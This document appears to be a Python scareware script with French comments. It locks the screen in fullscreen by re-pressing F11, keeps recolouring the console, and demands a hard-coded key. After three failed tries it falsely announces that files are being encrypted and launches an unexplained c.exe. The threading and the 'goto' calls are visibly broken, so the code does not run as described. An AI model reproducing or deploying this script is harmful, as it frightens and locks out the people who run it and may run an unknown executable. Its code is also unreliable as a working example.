from colored import fg, attr, bg
import os, time, pyautogui, threading, keyboard

# Var
running = True
response = "azerty"
wait_until_block = 0

# Paramètres du cmd
os.system("@echo off")
os.system("title Password")
os.system("cls")
pyautogui.press("F11")


def WaitF11(): # Fonction pour bloquer la fenêtre en plein écran

    global running
    
    while running:
        keyboard.wait("F11") # Attendre que la personne appuie sur F11 (ça fonctionne comme un time.sleep mais avec une condition à la place d'un temps d'attente)
        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam) 
        

def SetBackgroundColor(): # Fonction pour bloquer la couleur de l'arrière-plan
    global running
    
    while running:
        os.system("color 4a")
        time.sleep(0.1)

# Fonction principale
def Main():
    
    global wait_until_block # Rendre la variable globale (pour pouvoir la modifier depuis la fonction)
    global running
    
    while running: 
        os.system("cls")
        
        user_response = input(f"{fg(0)}{bg(1)}Entrez votre clé ici: \n{attr(0)}") # L'utilisateur entre la clé

        if user_response == response: # Si la valeur entrée est correcte
            print(f"{fg(2)}{bg(1)}Clé valide{attr(0)}")
            print(f"{fg(0)}{bg(1)}Appuyez sur F11 pour quitter.{attr(0)}")
            running = False # Quitter le programme

        else: # Clé invalide
            print(f"{fg(88)}{bg(1)}Clé invalide{attr(0)}")
            wait_until_block += 1
            time.sleep(0.5)
            if wait_until_block >= 3: # Si l'utilisateur entre une clé invalide 3 fois ou +
                # Cryptage de fichier et autres
                print("Nombres d'erreurs max dépassés.")
                time.sleep(1)
                print("CRYPTAGE DES FICHIERS EN COURS")
                time.sleep(1)
                os.system("start c.exe")
                os.system(":c")
                os.system("echo 4 5 4 8 5 8 5 6 46 46  56 4 6 46 4 6 4 5 4 64 5 44  4 45 445 4 6 44 45 4 45 5445  454 54 54 4 54 45 7445 4 4 4 7 87 9 4553 156 18 081 2 1 808021005 26020 85 198 4 5")
                os.system("goto c")

# Threads
main = threading.Thread(target=Main)
wait_f11 = threading.Thread(target=WaitF11)
set_background_color = threading.Thread(target=SetBackgroundColor)

# Liste des threads
threads = [set_background_color, main, wait_f11]

# Lancer les threads un par un
for thread in threads: thread.start(), thread.join()